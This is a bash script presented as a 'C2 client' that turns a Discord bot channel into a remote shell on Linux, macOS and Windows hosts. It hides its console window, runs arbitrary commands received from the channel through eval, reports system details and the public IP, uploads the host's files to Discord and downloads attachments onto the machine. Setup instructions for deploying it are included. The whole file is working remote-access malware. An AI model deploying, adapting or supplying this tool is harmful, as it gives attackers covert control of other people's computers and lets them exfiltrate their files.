#!/bin/bash

# ================================= BashCord C2 Client ======================================

# Using bash to send and receive commands from discord into a bash shell (on any system!)
# Works on Linux, MacOS and Windows


# **SETUP**
# 1. make a discord bot at https://discord.com/developers/applications/
# 2. Turn on ALL intents in the 'Bot' tab.
# 3. Give these permissions in Oauth2 tab and copy link into a browser url bar (Send-Messages, Read-messages/view-channels, Attach files)
# 4. Add the bot to your server
# 5. Click 'Reset Token' in "Bot" tab for your token
# 6. Change YOUR_BOT_TOKEN_HERE below with your bot token
# 7. Change CHANNEL_ID_HERE below to the channel ID of your channel.
# 8. Change BOT_USER_ID_HERE below to your bots user ID.

token="YOUR_BOT_TOKEN_HERE" # Your bot intents should be on and 'read messages' permissions when joining your server
chan="CHANNEL_ID_HERE" # On Discord app rightclick the channel > 'Copy Channel ID' (Make sure the bot can access this channel)
bot_id="BOT_USER_ID_HERE" # Settings > Advanced > Developer mode ON -- then On Discord app rightclick the bot > 'Copy User ID' 
HideWindow=1 # 1 = hide console window

generate_random_letters() {
    local letters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local password=""
    for i in {1..7}; do
        random_index=$((RANDOM % ${#letters}))
        password+=${letters:$random_index:1}
    done
    echo "$password"
    sleep 1
}

HideConsole() {
    if [ $HideWindow -gt 0 ]; then

        if [ "$(expr substr $(uname -s) 1 5)" = "MINGW" ]; then
            powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c exit' -NoNewWindow -Wait"
        else
            osascript -e 'tell application "Terminal" to set visible of window 1 to false'
        fi
    fi
}

Authenticate() {
    if [[ "$command_result" == *"$password"* ]]; then
        authenticated=1
        cwd=$(pwd)
        json_payload="{
          \"content\": \"\",
          \"embeds\": [
            {
              \"title\": \":white_check_mark:   **Session Connected**   :white_check_mark:\",
              \"description\": \"\`PS: $cwd >\`\",
              \"color\": 16777215
            }
          ]
        }"        
        curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
    else
        authenticated=0
    fi
}

Option_List() {
        json_payload="{
          \"content\": \"\",
          \"embeds\": [
            {
              \"title\": \":white_check_mark:   **Session Connected**   :white_check_mark:\",
              \"description\": \"**OPTIONS LIST**\n\n- **options**  - Show the options list\n- **pause**    - Pause this session (re-authenticate to resume)\n- **close**    - Close this session permanently\n- **upload**   - Upload a file to Discord [upload path/to/file.txt]\n- **download** - Download file to client [attach to 'download' command]\",
              \"color\": 16777215
            }
          ]
        }"        
        curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
}

get_recent_message() {
    recent_message=$(curl -s -H "Authorization: Bot $token" "https://discord.com/api/v9/channels/$chan/messages?limit=1")
    user_id=$(echo "$recent_message" | grep -o '"author":{"id":"[^"]*' | grep -o '[^"]*$')
    bot_check=$(echo "$recent_message" | grep -o '"bot":true')
    if [ -n "$user_id" ] && [ -z "$bot_check" ]; then
        recent_message=$(echo "$recent_message" | sed -n 's/.*"content":"\([^"]*\)".*/\1/p' | head -n 1)
        echo "$recent_message"
    else
        echo ""
    fi
}

sanitize_json() {
    sanitized_result="${1//\"/\\\"}"
    sanitized_result="${sanitized_result//\\/\\\\}"
    sanitized_result="${sanitized_result//\\n/\\\\n}"
    sanitized_result="${sanitized_result//\\ / }"
    echo "$sanitized_result"
}

get_linux_info() {
    os_info=$(uname -a)
    kernel_version=$(uname -r)
    uptime=$(uptime -p)
    cpu_info=$(cat /proc/cpuinfo | grep "model name" | head -n 1 | cut -d ":" -f 2 | sed 's/^[ \t]*//')
    mem_info=$(free -h | grep "Mem" | awk '{print "Total: " $2, " Used: " $3}')
    disk_info=$(df -h --total | grep "total" | awk '{print "Total disk space: " $2, " Used: " $3}')
    public_ip=$(curl -s https://api.ipify.org)
    
    linux_info="OS Info: $os_info\nKernel Version: $kernel_version\nUptime: $uptime\nCPU: $cpu_info\nMemory: $mem_info\nDisk: $disk_info\nPublic IP: $public_ip"
    echo "$linux_info"
}
get_macos_info() {
    os_info=$(uname -a)
    kernel_version=$(uname -r)
    uptime=$(uptime -p)
    cpu_info=$(sysctl -n machdep.cpu.brand_string)
    mem_info=$(system_profiler SPHardwareDataType | grep "Memory" | awk '{print "Total: " $2, " Used: " $4}')
    disk_info=$(df -h / | grep "/dev/" | awk '{print "Total disk space: " $2, " Used: " $3}')
    public_ip=$(curl -s https://api.ipify.org)
    
    macos_info="OS Info: $os_info\nKernel Version: $kernel_version\nUptime: $uptime\nCPU: $cpu_info\nMemory: $mem_info\nDisk: $disk_info\nPublic IP: $public_ip"
    echo "$macos_info"
}
get_windows_info() {
    os_info=$(systeminfo | grep "OS Name")
    uptime=$(systeminfo | grep "System Boot Time")
    cpu_info=$(wmic cpu get caption | grep -v "Caption")
    mem_info=$(systeminfo | grep "Total Physical Memory")
    disk_info=$(wmic logicaldisk get size,freespace,caption | grep "C:")
    public_ip=$(curl -s https://api.ipify.org)
    manufacturer=$(wmic computersystem get manufacturer | grep -v "Manufacturer")
    model=$(wmic computersystem get model | grep -v "Model")
    windows_version=$(uname -a)

    windows_info="$os_info\n$uptime\nCPU: $cpu_info\n$mem_info\nDisk: $disk_info\nPublic IP: $public_ip\nManufacturer: $manufacturer\nModel: $model\nWindows Version: $windows_version"
    echo "$windows_info"
}

send_file_to_discord() {
    local file_path="$1"
    local token="$token"
    local chan="$chan"
    
    if [ -z "$file_path" ]; then
        echo "Error: File path not provided."
        return 1
    fi
    
    if [ ! -f "$file_path" ]; then
        echo "Error: File does not exist at $file_path."
        return 1
    fi
    
    local file_name=$(basename "$file_path")

    curl -X POST \
         -H "Authorization: Bot $token" \
         -F "file=@$file_path;filename=$file_name" \
         "https://discord.com/api/v9/channels/$chan/messages"
}

download_attachment() {

    recent_message=$(curl -s -H "Authorization: Bot $token" "https://discord.com/api/v9/channels/$chan/messages?limit=1")
    user_id=$(echo "$recent_message" | grep -o '"author":{"id":"[^"]*' | grep -o '[^"]*$')
    bot_check=$(echo "$recent_message" | grep -o '"bot":true')
    if [ -n "$user_id" ] && [ -z "$bot_check" ]; then
        echo ""
    else
        echo ""
    fi
    
    # Extract attachment URL from recent message using pattern matching
    attachment_url=$(echo "$recent_message" | grep -oE 'https://cdn\.discordapp\.com/attachments/[^"]+')
    
    # Check if attachment URL exists
    if [ -n "$attachment_url" ]; then
        echo "Received 'download' command with attachment URL: $attachment_url"
        
        # Extract the filename from the URL
        file_name=$(basename "$attachment_url")

        # Download the file using curl
        curl -O -J -L "$attachment_url"
        
        # Check if the download was successful
        if [ $? -eq 0 ]; then
            echo "File downloaded successfully: $file_name"
        else
            echo "Error downloading file from URL: $attachment_url"
        fi
    else
        echo "No attachment found or invalid command for download."
    fi
}

execute_command() {

    command_result=$(eval "$1" 2>&1)
    if [ "$authenticated" -eq 1 ]; then

        if [ "$1" == "close" ]; then
            echo "Received 'close' command. Exiting Session..."
            json_payload='{"content": ":octagonal_sign:   **Session Closed**   :octagonal_sign:"}'
            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
            Sleep 1
            exit 0
        fi

        if [ "$1" == "pause" ]; then
            echo "Received 'pause' command. Pausing Session..."
            authenticated=0
            json_payload="{\"content\": \":pause_button:   **Session Paused**  |  Connect Code : \`$password \`  :pause_button:\"}"
            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
            return
        fi

        if [ "$1" == "download" ]; then
            echo "Received 'Download' command."
            command="$1"
            download_attachment
            return
        fi

        if [ "$1" == "options" ]; then
            echo "Received 'Options' command."
            Option_List
            return
        fi

        command="$1"
        command_args="${command#* }"
        if [[ "$command" == "upload"* && -n "$command_args" ]]; then
            echo "Received 'upload' command with file path: $command_args"
            send_file_to_discord "$command_args"  # Call the function to send the file
            return
        fi


        if [ "$1" == "sysinfo" ]; then
            echo "Received 'sysinfo' command. Retrieving system information..."
            case "$(uname -s)" in
                Linux*)  sys_info=$(get_linux_info);;
                Darwin*) sys_info=$(get_macos_info);;
                CYGWIN*) sys_info=$(get_windows_info);;
                MINGW*)  sys_info=$(get_windows_info);;
                *)       sys_info="Unsupported OS" ;;
            esac
            json_payload="{\"content\": \"\`\`\`$sys_info\`\`\`\"}"
            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
            return
        fi
        
        if [ $? -eq 0 ]; then
            if [ -n "$command_result" ]; then
                temp_file=$(mktemp)
                echo "$command_result" > "$temp_file"
                accumulated_lines=""
                while IFS= read -r line; do
                    sanitized_line=$(sanitize_json "$line")
                    if [ $((${#accumulated_lines} + ${#sanitized_line})) -gt 1900 ]; then
                        json_payload="{\"content\": \"\`\`\`$accumulated_lines\`\`\`\"}"
                        curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
                        accumulated_lines="$sanitized_line"
                        Sleep 1
                    else
                        accumulated_lines="$accumulated_lines\n$sanitized_line"
                    fi
                done < "$temp_file"
    
                if [ -n "$accumulated_lines" ]; then
                    json_payload="{\"content\": \"\`\`\`$accumulated_lines\`\`\`\"}"
                    curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
                fi
                rm "$temp_file"
            else
                cwd=$(pwd)
                json_payload="{\"content\": \":white_check_mark:   **Command Executed**   :white_check_mark: \n\`PS: $cwd >\`\"}"
                curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
            fi
        else
            error_message=$(echo "$command_result" | tr -d '\n' | sed 's/"/\\"/g')
            json_payload="{\"content\": \"\`\`\`$command_result\`\`\`\"}"
            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
        fi
    else
        Authenticate
    fi
}

random_letters=$(generate_random_letters)
password="${password}${random_letters}"
last_command_file=$(mktemp)
HideConsole

json_payload="{
  \"content\": \"\",
  \"embeds\": [
    {
      \"title\": \":hourglass: Session Waiting :hourglass:\",
      \"description\": \"**Session Code** : \`$password\`\",
      \"color\": 16777215
    }
  ]
}"
curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"

while true; do
    recent_message=$(get_recent_message)
    if [[ ! -z $recent_message && $recent_message != $(cat $last_command_file 2>/dev/null) ]]; then
        if [[ "$recent_message" =~ ^cd\  ]]; then
            cd_command=$(echo "$recent_message" | awk '{print $2}')
            cd "$cd_command"
            execute_command "pwd"
        else
            execute_command "$recent_message"
        fi
        echo "$recent_message" > $last_command_file
    fi
    sleep 5
done
